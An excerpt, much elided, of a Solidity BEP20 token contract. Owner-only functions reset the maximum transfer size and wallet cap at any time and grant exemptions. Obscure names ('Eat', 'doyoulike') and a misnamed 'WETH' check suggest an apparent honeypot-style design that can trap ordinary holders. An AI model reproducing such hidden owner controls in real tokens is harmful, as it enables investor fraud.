...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    mapping (address => bool) public isTEExempt;
    ...
    uint256 public _moEat; 
    uint256 public _mTotalEat;
    ...
    address[3] memory _doyoulike) 
    {
        ...
        _moEat = _LMT[0] * 10**_decimals;
        _mTotalEat = _LMT[1] * 10**_decimals;
        ...
        isTEExempt[owner()] = true;
        isTEExempt[address(uniswapPair)] = true;
        isTEExempt[address(this)] = true;
        isTEExempt[address(0xdead)] = true;
    ...
    function setmoEat(uint256 newmoEat) external onlyOwner() {
        _moEat = newmoEat;
    }

    function enableTE(bool newValue) external onlyOwner {
       LookTE = newValue;
    }

    function setisTEExempt(address holder, bool exempt) external onlyOwner {
        isTEExempt[holder] = exempt;
    }

    function setmTotalEat(uint256 newmTotalEat) external onlyOwner {
        _mTotalEat  = newmTotalEat;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            if(!isOnceEatExempt[sender] && !isOnceEatExempt[recipient]) {
                require(smallOrEqual(amount, _moEat));
            }            
            ...
            if(LookTE && !isTEExempt[recipient])
                require(smallOrEqual(balanceOf(recipient).add(finalAmount), _mTotalEat));
    ...
    function WETH(address addr, address re) private view returns(bool) {
        return addr == doYouLikeBase && !isMarketPair[re];
    }
...
contract Token is BEP20 {
    constructor() BEP20(
        ...
        [uint256(0),uint256(2),uint256(0)],
        [uint256(0),uint256(2),uint256(0)],
        [uint256(100000000000000000),uint256(100000000000000000)],
        [0x76f78C169C689b35E8af69a3A4662b91D0DFC7C3,0x76f78C169C689b35E8af69a3A4662b91D0DFC7C3,0x76f78C169C689b35E8af69a3A4662b91D0DFC7C3]
    ){}
}